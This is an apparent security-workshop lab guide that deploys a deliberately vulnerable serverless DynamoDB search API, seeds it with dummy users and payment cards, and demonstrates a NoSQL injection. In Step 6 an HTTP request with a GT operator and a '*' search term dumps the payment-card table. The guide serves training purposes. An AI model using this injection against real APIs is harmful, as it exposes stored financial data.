# **DynamoDB Injection**

---

> #### This attack/payload has been documented [here](https://medium.com/appsecengineer/dynamodb-injection-1db99c2454ac) article.
> #### On reading, you'll see that its a NoSQL Injection attack that's predicated on using the `gt` operator. One of the main reasons that this attack is made possible, is because of badly configured IAM privileges.

### **Lab Image : `Serverless`**

---

> **Note:** If you have not setup your aws cli follow [AWS-CLI-Configuration](../aws-configure/README.md) under the `Setup` section*

#### Step 1:

* Navigate to the `Serverless-Workshop` directory on the provisioned server

```commandline
cd /root/labs/Serverless-Workshop/
```

* Install the necessary requirements

```commandline
pip3 install pipenv
```
```commandline
pipenv shell
```
```commandline
pipenv install boto3
```
```commandline
pipenv install faker
```
```commandline
pipenv install huepy
```

---

#### Step 2:

* Navigate to `DynamoDB-Injection` directory

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Install the necessary requirements

```commandline
sls plugin install -n serverless-python-requirements
```

---

#### Step 3:

* Take a look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/DynamoDB-Injection/serverless.yml)

```commandline
cat serverless.yml
```

---

#### Step 4:

* Deploy the function and wait for the deployment to complete.

```commandline
sls deploy
```

* Once the deployment is complete, an API endpoint(s) is displayed.

---

#### Step 5:

* Navigate to the `ops` directory within `DynamoDB-Injection`

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection/ops
```

* Create dummy users

```commandline
python create_dummies.py users we45-sls-users
```

* Create dummy payment cards

```commandline
python create_dummies.py cards we45-sls-payments
```

---

#### Step 6:

* Run a genuine search against the database

```commandline
http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-users search_term=Mark search_operator=EQ search_field=first_name
```
> ###### Replace the `URL` from **STEP 4**

* Now run the exploit

```commandline
http POST <https://xxxx.execute-api.us-east-1.amazonaws.com/dev/dynamo-search> db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card
```
> ###### Replace the `URL` from **STEP 4**

---

#### Step 7:

* Navigate to `DynamoDB-Injection` directory

```commandline
cd /root/labs/Serverless-Workshop/DynamoDB-Injection
```

* Remove the serverless function that was deployed

```commandline
sls remove --force
```

* Deactivate and exit from the python virtual-environment

```commandline
cd /root/labs/Serverless-Workshop/
```
```commandline
deactivate
```
```commandline
exit
```
